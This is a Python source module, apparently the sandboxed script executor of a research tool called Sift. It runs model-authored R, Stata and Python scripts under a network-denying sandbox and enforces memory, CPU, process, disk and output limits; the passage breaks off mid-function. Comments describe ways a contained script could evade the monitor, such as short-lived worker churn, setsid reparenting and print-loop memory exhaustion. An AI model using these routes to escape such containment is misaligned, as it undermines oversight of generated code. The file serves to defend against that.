"""Sift — executor for R / Stata / Python scripts.

This is the only place in Sift that actually spawns subprocesses
against the researcher's data. Its job is narrow:

1. Stage the researcher's script and the Sift runtime library in a
   scoped scratch directory under ``<cwd>/.sift/runs/<run_id>/``.
2. Invoke the right interpreter (``Rscript``, ``stata-mp``, or
   ``python3``) against the script, with ``SIFT_RESULT_PATH``
   pointing at a file inside the scratch dir.
3. Wrap the invocation in ``sandbox-exec`` with a profile that denies
   network access. (Defense in depth — the runtime library is still
   the only sanctioned I/O surface inside the script.)
4. Capture stdout/stderr (the researcher's raw log), read the structured
   result from ``SIFT_RESULT_PATH``, and return both.

What this executor deliberately does NOT do:
- Enforce the sanitizer's SDC rules. Output goes to the caller (which
  routes through ``sanitizer.sanitize``). The executor just runs and
  reads.
- Treat script inspection as a security boundary. For R, Stata, and Python,
  the runtime-library contract plus OS sandbox provide the structural controls.
- Remove scratch directories immediately. Retaining them lets researchers
  inspect exactly what ran; Sift's maintenance policy handles expiration.
"""

from __future__ import annotations

import errno
import os
import platform
import secrets
import shutil
import subprocess
import sys
import sysconfig
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from functools import lru_cache
from importlib import resources
from pathlib import Path
from typing import Any, Callable, Literal

from sift.env_detect import Environment, detect_environment
from sift.process_tree import (
    ProcessIdentity,
    ProcessTreeSnapshotUnavailable,
    attach_posix_descendant_tracker,
    process_snapshot,
    tracked_process_identities,
    terminate_tracked_process_tree,
)


Language = Literal["R", "Stata", "Python"]


# Hard-required Python packages — without these the runtime library
# itself won't import. Reflects what ``sift/runtime/sift.py`` needs
# at module load (NOT what the helpers need to do their job; e.g.,
# ``from_lm`` needs statsmodels but the rest of the library works
# without it). The executor refuses Python runs only when one of
# these is missing.
_PYTHON_HARD_REQUIRED: frozenset[str] = frozenset({"pandas", "numpy"})

# Per-script wall-clock cap. 300s (5 min) is the working ceiling: a
# Stata panel build plus a small batch of two-way-FE ``reghdfe``
# regressions fits comfortably (the prior 120s default forced
# researchers to artificially split scripts to stay under the wall),
# while staying tight enough that a runaway loop fails fast. For
# scripts that need more, the workflow Sift encourages is "split:
# build and save the analysis panel first, then run regressions in
# batches against the saved file" — that pattern keeps each call
# well under the cap and makes failure modes localizable.
#
# Override via ``SIFT_SCRIPT_TIMEOUT_SECONDS`` for the unusual case
# where 5 min isn't enough (large simulations, bootstraps with many
# replications) or where you want a tighter cap (CI smoke tests).
# Bad values fall back to the default rather than crashing the
# bridge — a malformed env var should never strand the user — but
# emit a warning so a typo (``5min``, ``300s``) isn't silent. Cap
# at 24 hours: a value of e.g. ``2147483647`` would be accepted by
# the prior parser, letting a runaway script hang the runner for
# years; the upper bound prevents that without limiting any
# realistic research workload (a 24h script is already in
# "should be a batch job" territory, not "interactive analysis").
_TIMEOUT_FLOOR_SECONDS = 1
_TIMEOUT_CEILING_SECONDS = 24 * 60 * 60  # 24 hours


def _resolve_default_timeout() -> int:
    raw = os.environ.get("SIFT_SCRIPT_TIMEOUT_SECONDS", "").strip()
    if not raw:
        return 300
    try:
        v = int(raw)
    except ValueError:
        import logging
        logging.getLogger("sift.executor").warning(
            "SIFT_SCRIPT_TIMEOUT_SECONDS=%r is not an integer; "
            "falling back to default 300s", raw,
        )
        return 300
    if v < _TIMEOUT_FLOOR_SECONDS:
        import logging
        logging.getLogger("sift.executor").warning(
            "SIFT_SCRIPT_TIMEOUT_SECONDS=%d is below floor %ds; "
            "falling back to default 300s", v, _TIMEOUT_FLOOR_SECONDS,
        )
        return 300
    if v > _TIMEOUT_CEILING_SECONDS:
        import logging
        logging.getLogger("sift.executor").warning(
            "SIFT_SCRIPT_TIMEOUT_SECONDS=%d exceeds ceiling %ds (24h); "
            "clamping. A runaway script shouldn't hang the runner for "
            "longer than that.", v, _TIMEOUT_CEILING_SECONDS,
        )
        return _TIMEOUT_CEILING_SECONDS
    return v


DEFAULT_TIMEOUT_SECONDS = _resolve_default_timeout()


# ---------------------------------------------------------------------------
# Per-script address-space ceiling
# ---------------------------------------------------------------------------
#
# ``sandbox-exec`` confines what a script can *reach* (filesystem,
# network); it does not confine how much memory it can *allocate*. A
# generated script with an accidental cross join, an unbounded
# accumulation loop, or a bad chunk size can therefore take the whole
# machine into swap and get the app OOM-killed — taking the
# researcher's session with it. The timeout doesn't help: a thrashing
# process is still "running".
#
# Fix: an RLIMIT_AS (virtual address space) ceiling applied in the
# child between fork and exec. Exceeding it surfaces inside the script
# as a normal allocation failure (``MemoryError`` in Python, "cannot
# allocate vector of size ..." in R) which the existing error-summary
# path already classifies and hands back as a repairable error — the
# model can react by chunking instead of the session dying.
#
# Default 8 GiB: comfortably above any legitimate in-sandbox analysis
# on a research laptop, far below the point where a 16 GB machine
# becomes unusable. ``0`` disables the limit for researchers on big
# shared hardware who know what they're doing.
_DEFAULT_MAX_ADDRESS_SPACE_BYTES = 8 * 1024 * 1024 * 1024


def script_memory_limit_bytes() -> int:
    """Return the per-script address-space ceiling in bytes (0 = off).

    Read at call time so it can be changed without restarting. An
    unparseable value falls back to the default rather than disabling
    the limit — a typo must not silently remove a protection. An
    explicit ``0`` does disable it, because that is unambiguous.
    """
    raw = os.environ.get("SIFT_SCRIPT_MAX_MEMORY_BYTES", "").strip()
    if not raw:
        return _DEFAULT_MAX_ADDRESS_SPACE_BYTES
    try:
        val = int(raw)
    except ValueError:
        return _DEFAULT_MAX_ADDRESS_SPACE_BYTES
    if val == 0:
        return 0
    return val if val > 0 else _DEFAULT_MAX_ADDRESS_SPACE_BYTES


def _memory_limit_preexec():
    """Return a ``preexec_fn`` applying RLIMIT_AS, or None.

    Runs in the forked child before exec. Returns None when the limit
    is disabled or the platform has no working ``RLIMIT_AS`` (it is
    absent on some platforms and is a no-op on others), so callers can
    pass the result straight through to ``Popen(preexec_fn=...)``.
    """
    limit = script_memory_limit_bytes()
    if limit <= 0:
        return None
    try:
        import resource
    except ImportError:
        return None
    if not hasattr(resource, "RLIMIT_AS"):
        return None

    def _apply() -> None:
        # Never raise out of preexec_fn: an exception here kills the
        # child with an opaque error. Best-effort by design — the
        # sandbox and timeout remain the load-bearing controls.
        try:
            soft, hard = resource.getrlimit(resource.RLIMIT_AS)
            new_soft = limit if hard in (resource.RLIM_INFINITY,) else min(limit, hard)
            resource.setrlimit(resource.RLIMIT_AS, (new_soft, hard))
        except Exception:  # noqa: BLE001
            pass

    return _apply


# --- CPU time, process count, and single-file-size ceilings ---
#
# RLIMIT_AS bounds address-space *reach*; it says nothing about a
# script that's CPU-bound rather than memory-bound (a runaway
# recursive fit, an infinite retry loop that never allocates much) or
# one that forks itself into a fork bomb (each child individually
# under the memory ceiling, the sum taking the machine down). Three
# more POSIX rlimits close those gaps. Same fail-safe posture as the
# memory ceiling throughout: an unparseable override falls back to
# the default (never silently disables a guard), and every apply
# step is wrapped so a limit this Python build doesn't support (rare,
# platform-dependent) degrades to "not applied" rather than crashing
# the child.
#
# Defaults are deliberately generous — these exist to catch runaway
# scripts and fork bombs, not to constrain a normal, even a heavy,
# legitimate analysis:
#   - 600s (10 min) CPU time: well above any interactive regression /
#     fit; a script legitimately needing longer already has to clear
#     the separate wall-clock ``timeout_seconds`` first.
#   - 64 processes: comfortable headroom for R ``parallel::makeCluster``
#     or Python ``multiprocessing.Pool`` on a modern laptop's core
#     count, while a fork bomb (which needs thousands to be
#     effective) is stopped almost immediately.
#   - 2 GiB single-file size: a script legitimately writing a large
#     Parquet/CSV export has room; an accidental infinite write loop
#     is stopped well before it can fill a disk. This bounds any ONE
#     file's size, not total disk usage across many files — the
#     honest scope of what RLIMIT_FSIZE actually enforces.
_DEFAULT_MAX_CPU_SECONDS = 600
_DEFAULT_MAX_PROCESSES = 64
_DEFAULT_MAX_FILE_SIZE_BYTES = 2 * 1024 * 1024 * 1024
# Keep enough space for Sift to record the failure, for the operating system
# to remain usable, and for the researcher to clean up. RLIMIT_FSIZE only
# constrains one file; this parent-side reserve also catches a script which
# creates an unbounded number of individually small files.
_DEFAULT_MIN_FREE_DISK_BYTES = 512 * 1024 * 1024


def _int_env_with_fallback(var: str, default: int) -> int:
    """Shared parse-with-fail-safe-fallback logic for resource limits
    below. ``0`` explicitly disables (unambiguous); anything
    unparseable or negative falls back to the default rather than
    silently turning the guard off."""
    raw = os.environ.get(var, "").strip()
    if not raw:
        return default
    try:
        val = int(raw)
    except ValueError:
        return default
    if val == 0:
        return 0
    return val if val > 0 else default


def script_cpu_limit_seconds() -> int:
    """Per-script CPU-time ceiling in seconds (0 = off)."""
    return _int_env_with_fallback("SIFT_SCRIPT_MAX_CPU_SECONDS",
                                   _DEFAULT_MAX_CPU_SECONDS)


def script_process_limit() -> int:
    """Per-script descendant-process ceiling (0 = off).

    Production enforcement is parent-side and counts only the launched
    script tree. ``RLIMIT_NPROC`` is deliberately not used by the launcher:
    it counts the researcher's entire UID and can reject a normal R/Python
    fork merely because other desktop applications are running.
    """
    return _int_env_with_fallback("SIFT_SCRIPT_MAX_PROCESSES",
                                   _DEFAULT_MAX_PROCESSES)


def script_file_size_limit_bytes() -> int:
    """Per-script single-file-size ceiling, RLIMIT_FSIZE (0 = off)."""
    return _int_env_with_fallback("SIFT_SCRIPT_MAX_FILE_SIZE_BYTES",
                                   _DEFAULT_MAX_FILE_SIZE_BYTES)


def script_min_free_disk_bytes() -> int:
    """Free-space reserve for the script's writable filesystem (0 = off).

    Invalid and negative overrides retain the safe default. The check uses
    filesystem metadata only; it never walks or sizes researcher files.
    """
    return _int_env_with_fallback(
        "SIFT_SCRIPT_MIN_FREE_DISK_BYTES",
        _DEFAULT_MIN_FREE_DISK_BYTES,
    )


def _free_disk_bytes(directory: Path) -> int | None:
    """Return free bytes on ``directory``'s filesystem, or ``None``.

    ``shutil.disk_usage`` is a constant-size filesystem query. In
    particular, do not replace this with a recursive workspace scan: that
    would make the safety monitor's own work attacker-controlled.
    """
    try:
        return max(0, int(shutil.disk_usage(directory).free))
    except OSError:
        return None


def _disk_reserve_preflight_error(
    directory: Path, reserve_bytes: int,
) -> str | None:
    """Return an actionable launch error when the reserve is not enforceable."""
    if reserve_bytes <= 0:
        return None
    observed = _free_disk_bytes(directory)
    if observed is None:
        return (
            "script was not started because Sift could not inspect free disk "
            "space on the analysis workspace filesystem. Free-space "
            "monitoring is required while SIFT_SCRIPT_MIN_FREE_DISK_BYTES "
            "is enabled; verify that the workspace is mounted and readable, "
            "or deliberately set that variable to 0 to disable the guard"
        )
    if observed < reserve_bytes:
        return (
            "script was not started because the analysis workspace "
            f"filesystem has {observed} free bytes, below Sift's configured "
            f"{reserve_bytes}-byte safety reserve. Free disk space, move the "
            "workspace to a filesystem with more capacity, or deliberately "
            "adjust SIFT_SCRIPT_MIN_FREE_DISK_BYTES"
        )
    return None


def _rlimit_preexec(rlimit_name: str, limit: int):
    """Generic ``preexec_fn`` builder for a simple (soft==hard-capped)
    POSIX rlimit. Returns ``None`` when the limit is disabled or the
    platform's ``resource`` module doesn't expose that rlimit —
    callers fold the result into the combined preexec below.
    """
    if limit <= 0:
        return None
    try:
        import resource
    except ImportError:
        return None
    rlimit_const = getattr(resource, rlimit_name, None)
    if rlimit_const is None:
        return None

    def _apply() -> None:
        try:
            soft, hard = resource.getrlimit(rlimit_const)
            new_soft = limit if hard == resource.RLIM_INFINITY else min(limit, hard)
            resource.setrlimit(rlimit_const, (new_soft, hard))
        except Exception:  # noqa: BLE001 — best-effort, never block exec
            pass

    return _apply


def resource_limits_preexec():
    """Combined ``preexec_fn`` applying every configured rlimit
    (address space, CPU time, process count, single-file size) in one
    child-side hook. ``subprocess.Popen`` accepts exactly one
    ``preexec_fn``, so this is what ``run_script`` actually passes;
    the individual ``_*_preexec`` functions stay separately callable
    (and separately tested) for the memory ceiling specifically,
    which predates the other three and has its own regression tests
    pinning its standalone behaviour.

    Returns ``None`` only when every individual limit is disabled —
    an all-off configuration means "no preexec_fn needed at all",
    which ``Popen(preexec_fn=None)`` treats as a no-op child hook.
    """
    steps = [
        f for f in (
            _memory_limit_preexec(),
            _rlimit_preexec("RLIMIT_CPU", script_cpu_limit_seconds()),
            _rlimit_preexec("RLIMIT_NPROC", script_process_limit()),
            _rlimit_preexec("RLIMIT_FSIZE", script_file_size_limit_bytes()),
        )
        if f is not None
    ]
    if not steps:
        return None

    def _apply_all() -> None:
        for step in steps:
            step()

    return _apply_all


def _resource_limited_argv(
    cmd: list[str], platform_name: str | None = None,
) -> list[str]:
    """Wrap ``cmd`` in a fixed Bash launcher that applies soft rlimits.

    ``preexec_fn`` is unsafe in a threaded application: the forked child
    can inherit a locked mutex and deadlock before ``exec``. Sift's UI and
    runners are threaded, so production launches set limits in a tiny,
    fixed shell process and immediately ``exec`` the sandbox command.
    User/model text is never interpolated into the shell program; the real
    command travels only through ``"$@"`` argv.

    On macOS, RLIMIT_AS/``ulimit -v`` is not a functioning memory boundary.
    The parent-side process-tree monitor enforces memory there instead.
    Linux keeps RLIMIT_AS as a fast kernel guard in addition to the monitor.
    """
    platform_name = platform_name or sys.platform
    if platform_name.startswith("win"):
        return cmd

    # Clamp each configured soft limit to the inherited hard ceiling. A Sift
    # process may itself run under a tighter container/service limit; trying
    # to raise that hard limit would abort an otherwise valid, more tightly
    # constrained run before the interpreter starts.
    clauses: list[str] = [
        "set -e",
        'sift_soft_limit() { local flag="$1" wanted="$2" hard; '
        'hard="$(ulimit -H "$flag")"; '
        'if [ "$hard" = unlimited ] || [ "$wanted" -le "$hard" ]; then '
        'ulimit -S "$flag" "$wanted"; fi; }',
    ]
    memory = script_memory_limit_bytes()
    if platform_name.startswith("linux") and memory > 0:
        clauses.append(f"sift_soft_limit -v {(memory + 1023) // 1024}")
    cpu = script_cpu_limit_seconds()
    if cpu > 0:
        clauses.append(f"sift_soft_limit -t {cpu}")
    # Do not apply RLIMIT_NPROC/``ulimit -u`` here. It limits the complete
    # login UID before bubblewrap enters any namespace on Linux and has the
    # same false-rejection failure on macOS. The parent-side tree counter is
    # the cross-platform POSIX guard; Windows uses its Job Object limit.
    file_size = script_file_size_limit_bytes()
    if file_size > 0:
        # Bash's -f unit is 1024-byte blocks (unlike the POSIX C API's
        # RLIMIT_FSIZE byte value).
        clauses.append(f"sift_soft_limit -f {(file_size + 1023) // 1024}")
    if len(clauses) == 2:
        return cmd
    shell = next(
        (p for p in (Path("/bin/bash"), Path("/usr/bin/bash")) if p.is_file()),
        None,
    )
    if shell is None:
        raise RuntimeError(
            "Sift cannot apply its POSIX CPU and file resource limits because "
            "Bash is unavailable; install Bash or explicitly disable every "
            "configured POSIX rlimit before running research code"
        )
    clauses.append('exec "$@"')
    return [str(shell), "-c", "; ".join(clauses), "sift-limits", *cmd]


class _MemoryLimitExceeded(RuntimeError):
    def __init__(self, observed_bytes: int, limit_bytes: int):
        self.observed_bytes = observed_bytes
        self.limit_bytes = limit_bytes
        super().__init__(f"process tree used {observed_bytes} bytes")


class _ProcessLimitExceeded(RuntimeError):
    def __init__(self, observed_processes: int, limit_processes: int):
        self.observed_processes = observed_processes
        self.limit_processes = limit_processes
        super().__init__(f"process tree used {observed_processes} processes")


class _CpuLimitExceeded(RuntimeError):
    def __init__(self, observed_seconds: float, limit_seconds: float):
        self.observed_seconds = observed_seconds
        self.limit_seconds = limit_seconds
        super().__init__(f"process tree used {observed_seconds:.3f} CPU seconds")


class _DiskReserveExceeded(RuntimeError):
    def __init__(self, observed_free_bytes: int, reserve_bytes: int):
        self.observed_free_bytes = observed_free_bytes
        self.reserve_bytes = reserve_bytes
        super().__init__(
            f"filesystem has {observed_free_bytes} free bytes; "
            f"reserve is {reserve_bytes} bytes"
        )


class _ResourceMonitorUnavailable(RuntimeError):
    def __init__(self, resource_name: str):
        self.resource_name = resource_name
        super().__init__(f"{resource_name} process-tree monitor is unavailable")


def _process_tree_rss_bytes(
    pid: int,
    identities: tuple[ProcessIdentity, ...] | None = None,
) -> int | None:
    """Best-effort resident memory for ``pid`` and all descendants."""
    try:
        import psutil
        if identities is not None:
            processes = []
            for identity in identities:
                try:
                    processes.append(psutil.Process(identity.pid))
                except psutil.NoSuchProcess:
                    continue
                except psutil.AccessDenied:
                    return None
        else:
            root = psutil.Process(pid)
            processes = [root]
            try:
                processes.extend(root.children(recursive=True))
            except (psutil.AccessDenied, PermissionError, OSError):
                # A root-only value is not a process-tree memory bound.
                return None
        total = 0
        for process in processes:
            try:
                total += int(process.memory_info().rss)
            except psutil.NoSuchProcess:
                continue
            except psutil.AccessDenied:
                return None
        return total
    except Exception:  # noqa: BLE001 — kernel rlimits/wall timeout still apply
        return None


def _process_tree_process_count(
    pid: int,
    identities: tuple[ProcessIdentity, ...] | None = None,
) -> int | None:
    """Best-effort count of ``pid`` and all of its descendants."""
    if identities is not None:
        return len(identities)
    try:
        import psutil

        root = psutil.Process(pid)
        try:
            return 1 + len(root.children(recursive=True))
        except (psutil.AccessDenied, PermissionError, OSError):
            return None
    except Exception:  # noqa: BLE001 — kernel guard/timeout remain available
        return None


def _process_tree_cpu_seconds(
    pid: int,
    identities: tuple[ProcessIdentity, ...] | None = None,
) -> float | None:
    """Best-effort aggregate user+system CPU for all descendants."""
    if sys.platform == "darwin":
        try:
            import ctypes

            if identities is None:
                snapshot = process_snapshot()
                if pid not in snapshot:
                    return None
                owned = {pid}
                changed = True
                while changed:
                    changed = False
                    for identity in snapshot.values():
                        if identity.pid not in owned and identity.ppid in owned:
                            owned.add(identity.pid)
                            changed = True
            else:
                owned = {identity.pid for identity in identities}

            libproc = ctypes.CDLL("/usr/lib/libproc.dylib", use_errno=True)
            libproc.proc_pid_rusage.argtypes = [
                ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
            ]
            libproc.proc_pid_rusage.restype = ctypes.c_int
            class _MachTimebaseInfo(ctypes.Structure):
                _fields_ = [
                    ("numer", ctypes.c_uint32),
                    ("denom", ctypes.c_uint32),
                ]

            timebase = _MachTimebaseInfo()
            libc = ctypes.CDLL(None, use_errno=True)
            libc.mach_timebase_info.argtypes = [ctypes.POINTER(_MachTimebaseInfo)]
            libc.mach_timebase_info.restype = ctypes.c_int
            if (
                libc.mach_timebase_info(ctypes.byref(timebase)) != 0
                or timebase.denom == 0
            ):
                raise OSError("mach_timebase_info unavailable")

            total_ticks = 0
            observed = 0
            for owned_pid in owned:
                # ``proc_pid_rusage`` takes no destination-size argument and
                # writes the complete structure for the requested flavor.
                # Do not model only the prefix with a guessed ctypes.Structure:
                # newer Darwin SDKs can extend the tail, which would turn a
                # too-small Python object into a native buffer overflow.  A
                # deliberately oversized raw buffer is ABI-safe; every
                # rusage_info flavor begins with UUID + user/system absolute
                # time.  Darwin reports Mach ticks, not nanoseconds; conversion
                # through mach_timebase_info below is load-bearing on Apple
                # Silicon, where one tick is currently much larger than 1 ns.
                usage = ctypes.create_string_buffer(1024)
                if libproc.proc_pid_rusage(
                    owned_pid, 2, ctypes.byref(usage),
                ) != 0:
                    # A worker may exit between snapshot and accounting.  It
                    # no longer consumes CPU, so this race is not monitor
                    # unavailability; retain the live observations.
                    continue
                observed += 1
                user_ticks = ctypes.c_uint64.from_buffer(usage, 16).value
                system_ticks = ctypes.c_uint64.from_buffer(usage, 24).value
                # rusage_info_v2 offsets 96/104 are cumulative CPU for
                # reaped children.  Without them, a script can evade the
                # aggregate ceiling by repeatedly launching short CPU-bound
                # workers which exit between 100 ms monitor samples.
                child_user_ticks = ctypes.c_uint64.from_buffer(usage, 96).value
                child_system_ticks = ctypes.c_uint64.from_buffer(usage, 104).value
                total_ticks += int(
                    user_ticks
                    + system_ticks
                    + child_user_ticks
                    + child_system_ticks
                )
            return (
                total_ticks
                * int(timebase.numer)
                / int(timebase.denom)
                / 1_000_000_000
                if observed
                else None
            )
        except Exception:  # noqa: BLE001 - psutil fallback below
            pass
    try:
        import psutil

        if identities is not None:
            processes = []
            for identity in identities:
                try:
                    processes.append(psutil.Process(identity.pid))
                except psutil.NoSuchProcess:
                    continue
                except psutil.AccessDenied:
                    return None
        else:
            root = psutil.Process(pid)
            processes = [root]
            try:
                processes.extend(root.children(recursive=True))
            except (psutil.AccessDenied, PermissionError, OSError):
                return None
        total = 0.0
        for process in processes:
            try:
                times = process.cpu_times()
                total += float(times.user) + float(times.system)
                # Linux exposes cumulative reaped-child time here.  Include
                # it for the same short-worker churn case as Darwin above;
                # getattr keeps compatibility with psutil platforms whose
                # pcputimes tuple has only user/system fields.
                total += float(getattr(times, "children_user", 0.0))
                total += float(getattr(times, "children_system", 0.0))
            except psutil.NoSuchProcess:
                continue
            except psutil.AccessDenied:
                return None
        return total
    except Exception:  # noqa: BLE001 — kernel guard/wall timeout remain available
        return None


def _communicate_with_memory_guard(
    proc: subprocess.Popen[str], *, timeout_seconds: int,
    memory_limit_bytes: int, process_limit: int = 0,
    cpu_limit_seconds: float = 0,
    disk_directory: Path | None = None, disk_reserve_bytes: int = 0,
) -> tuple[str, str]:
    """Communicate while enforcing process-tree resource ceilings.

    The selector drains both pipes continuously but retains only a bounded
    prefix from each. This prevents a generated print loop from moving its
    memory exhaustion attack into the unsandboxed parent process.
    """
    streams = {
        "stdout": getattr(proc, "stdout", None),
        "stderr": getattr(proc, "stderr", None),
    }
    if not any(streams.values()):
        return proc.communicate(timeout=timeout_seconds)
    buffers = {"stdout": bytearray(), "stderr": bytearray()}
    truncated = {"stdout": False, "stderr": False}
    active_streams = {
        name: stream for name, stream in streams.items() if stream is not None
    }

    # select() on Windows accepts sockets only, not anonymous pipe handles.
    # Poll the pipe byte count with PeekNamedPipe there; POSIX keeps the more
    # efficient selector path.  A reader thread would also drain Windows
    # pipes, but it cannot be stopped safely while blocked during a resource
    # violation and would race the caller's post-termination recovery drain.
    selector: Any = None
    peek_named_pipe: Any = None
    get_osfhandle: Any = None
    if os.name == "nt":
        import ctypes
        import msvcrt
        from ctypes import wintypes

        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)  # type: ignore[attr-defined]
        peek_named_pipe = kernel32.PeekNamedPipe
        peek_named_pipe.argtypes = [
            wintypes.HANDLE,
            ctypes.c_void_p,
            wintypes.DWORD,
            ctypes.POINTER(wintypes.DWORD),
            ctypes.POINTER(wintypes.DWORD),
            ctypes.POINTER(wintypes.DWORD),
        ]
        peek_named_pipe.restype = wintypes.BOOL
        get_osfhandle = msvcrt.get_osfhandle
    else:
        import selectors

        selector = selectors.DefaultSelector()
        for name, stream in active_streams.items():
            selector.register(stream, selectors.EVENT_READ, name)

    def _append(name: str, chunk: bytes) -> None:
        remaining = MAX_CAPTURED_STREAM_BYTES - len(buffers[name])
        if remaining > 0:
            buffers[name].extend(chunk[:remaining])
        if len(chunk) > max(remaining, 0):
            truncated[name] = True

    def _drain_ready(wait_seconds: float) -> None:
        if os.name != "nt":
            for key, _mask in selector.select(timeout=wait_seconds):
                try:
                    chunk = os.read(key.fd, 64 * 1024)
                except BlockingIOError:
                    continue
                except OSError:
                    chunk = b""
                if chunk:
                    _append(str(key.data), chunk)
                else:
                    selector.unregister(key.fileobj)
                    active_streams.pop(str(key.data), None)
            return

        import ctypes
        from ctypes import wintypes

        drained = False
        for name, stream in tuple(active_streams.items()):
            available = wintypes.DWORD()
            handle = get_osfhandle(stream.fileno())
            if not peek_named_pipe(
                handle, None, 0, None, ctypes.byref(available), None,
            ):
                error = ctypes.get_last_error()  # type: ignore[attr-defined]
                if error in (6, 109, 232):  # invalid/broken/no-data pipe
                    active_streams.pop(name, None)
                    continue
                raise OSError(error, "PeekNamedPipe failed")
            if available.value:
                chunk = os.read(
                    stream.fileno(), min(int(available.value), 64 * 1024),
                )
                if chunk:
                    _append(name, chunk)
                    drained = True
                else:
                    active_streams.pop(name, None)
        if not drained and wait_seconds > 0:
            time.sleep(wait_seconds)

    deadline = time.monotonic() + timeout_seconds
    # Pipe readiness can be effectively continuous for a print loop.  Keep
    # resource discovery on a wall-clock cadence instead of repeating a full
    # process snapshot after every 64 KiB read (which made monitor overhead
    # scale with attacker-controlled output volume, especially on macOS where
    # marker recovery consults each process environment).
    next_resource_check = 0.0
    exit_cleanup_started = False
    disk_checked_after_exit = False
    try:
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise subprocess.TimeoutExpired(proc.args, timeout_seconds)
            _drain_ready(min(0.1, remaining))

            process_exited = proc.poll() is not None
            if process_exited and not exit_cleanup_started:
                # A daemonized child may inherit these capture pipes after the
                # interpreter exits, preventing EOF and turning a successful
                # run into a wall timeout.  End tracked descendants as soon as
                # the root status is known.  The outer completion cleanup is
                # idempotent and remains the final lifecycle backstop.
                terminate_tracked_process_tree(proc)
                exit_cleanup_started = True
            now = time.monotonic()
            identities = None
            check_resources = False
            cadence_due = now >= next_resource_check
            if cadence_due:
                next_resource_check = now + 0.1
            check_disk = disk_reserve_bytes > 0 and (
                cadence_due or (process_exited and not disk_checked_after_exit)
            )
            if check_disk:
                if disk_directory is None:
                    raise _ResourceMonitorUnavailable("free-disk") from None
                observed_free = _free_disk_bytes(disk_directory)
                if observed_free is None:
                    raise _ResourceMonitorUnavailable("free-disk") from None
                if process_exited:
                    disk_checked_after_exit = True
                if observed_free < disk_reserve_bytes:
                    raise _DiskReserveExceeded(
                        observed_free, disk_reserve_bytes,
                    ) from None
            if (
                not process_exited
                and (memory_limit_bytes > 0 or process_limit > 0 or cpu_limit_seconds > 0)
                and cadence_due
            ):
                check_resources = True
                # One identity-verified ownership snapshot feeds every guard.
                # The tracker includes marker-recovered children which already
                # called setsid and were reparented outside root.children().
                try:
                    identities = tracked_process_identities(proc)
                except ProcessTreeSnapshotUnavailable:
                    # The root may have exited in the narrow interval after
                    # poll() above. That is normal completion, not monitor
                    # failure. macOS can expose this as a very short-lived
                    # state where ``ps`` has already dropped the process but
                    # waitpid has not made its status observable to Popen yet.
                    # Retry only that completion check for at most 40ms. A
                    # genuinely live root which remains unverifiable still
                    # fails closed; no resource sample is skipped for it.
                    root_exited = False
                    for retry in range(5):
                        if proc.poll() is not None:
                            root_exited = True
                            break
                        if retry < 4:
                            time.sleep(0.01)
                    if not root_exited:
                        raise _ResourceMonitorUnavailable(
                            "process-identity",
                        ) from None
                    process_exited = True
                    if not exit_cleanup_started:
                        terminate_tracked_process_tree(proc)
                        exit_cleanup_started = True
            if not process_exited and check_resources and memory_limit_bytes > 0:
                observed = _process_tree_rss_bytes(proc.pid, identities)
                if observed is None:
                    raise _ResourceMonitorUnavailable("memory") from None
                if observed > memory_limit_bytes:
                    raise _MemoryLimitExceeded(
                        observed, memory_limit_bytes,
                    ) from None
            if not process_exited and check_resources and process_limit > 0:
                observed_processes = _process_tree_process_count(
                    proc.pid, identities,
                )
                if observed_processes is None:
                    raise _ResourceMonitorUnavailable("process-count") from None
                if observed_processes > process_limit:
                    raise _ProcessLimitExceeded(
                        observed_processes, process_limit,
                    ) from None
            if not process_exited and check_resources and cpu_limit_seconds > 0:
                observed_cpu = _process_tree_cpu_seconds(proc.pid, identities)
                if observed_cpu is None:
                    raise _ResourceMonitorUnavailable("CPU-time") from None
                if observed_cpu > cpu_limit_seconds:
                    raise _CpuLimitExceeded(
                        observed_cpu, cpu_limit_seconds,
                    ) from None
            if process_exited and not active_streams:
                break
    except Exception as exc:
        # ``run_script`` kills and drains the child after a timeout or a
        # resource violation. Bytes already consumed here are no longer in
        # the pipe, so preserve the bounded prefixes on the exception for
        # that recovery path. Without this handoff, the most useful early
        # diagnostic output disappeared precisely on failed runs.
        for name in ("stdout", "stderr"):
            try:
                setattr(exc, f"_sift_captured_{name}", bytes(buffers[name]))
                setattr(exc, f"_sift_{name}_truncated", truncated[name])
            except Exception:  # noqa: BLE001 - never mask the stop reason
                pass
        raise
    finally:
        if selector is not None:
            selector.close()

    result: dict[str, str] = {}
    for name, value in buffers.items():
        text = bytes(value).decode("utf-8", errors="replace")
        if truncated[name]:
            text += _CAPTURE_TRUNCATION_MARKER.format(
                limit=MAX_CAPTURED_STREAM_BYTES,
            )
        result[name] = text
    # ``communicate()`` closes its capture streams, but this bounded selector
    # path reads the underlying descriptors directly with ``os.read``.  Close
    # the Python stream wrappers explicitly after normal completion so every
    # parser/script invocation releases both descriptors immediately.  On an
    # exceptional stop the caller still owns the open pipes and drains them
    # after terminating the process, so closure intentionally belongs only to
    # this successful path.
    for stream in streams.values():
        if stream is not None:
            stream.close()
    return result["stdout"], result["stderr"]


# Where per-run scratch dirs live, relative to cwd.
RUNS_SUBDIR = ".sift/runs"

# Hard caps on the JSONL result file. A model-authored script can
# loop and call ``sift_result_*`` thousands of times — each call
# emits one JSONL line. Without caps, the executor would parse,
# token-validate, sanitize, store, render, and ship every payload,
# blowing memory and conversation context regardless of the inline-
# trim that ``submit_script`` applies later. We trim at the FIRST
# point the runtime can refuse: when reading the result file.
#
#   * 8 MB on file size — enough for a few hundred wide regressions
#     (a typical regression payload is 5–20 KB after auth-token
#     framing).
#   * 256 entries — beyond this we're either looping unintentionally
#     or producing more results than a researcher will inspect in one
#     turn. The ceiling is intentionally well above legitimate
#     batch sizes (a 24-spec sweep is comfortable) but well below
#     anything that would suggest a control-flow bug or exfil loop.
#
# When a cap is hit we KEEP the early payloads (so a partial result
# still surfaces) and raise a warning so the caller knows results
# were truncated.
MAX_RESULT_FILE_BYTES = 8 * 1024 * 1024
MAX_RESULT_PAYLOADS = 256
# stdout/stderr are diagnostics rather than bulk export channels. Retain a
# generous prefix for the researcher while discarding later bytes after the
# cap; the pipe continues to be drained so the child cannot deadlock.
MAX_CAPTURED_STREAM_BYTES = 8 * 1024 * 1024
_CAPTURE_TRUNCATION_MARKER = "\n[SIFT OUTPUT TRUNCATED AT {limit} BYTES]\n"


def _merge_bounded_capture(
    prefix: bytes | str | None,
    prefix_truncated: bool,
    tail: bytes | str | None,
) -> str:
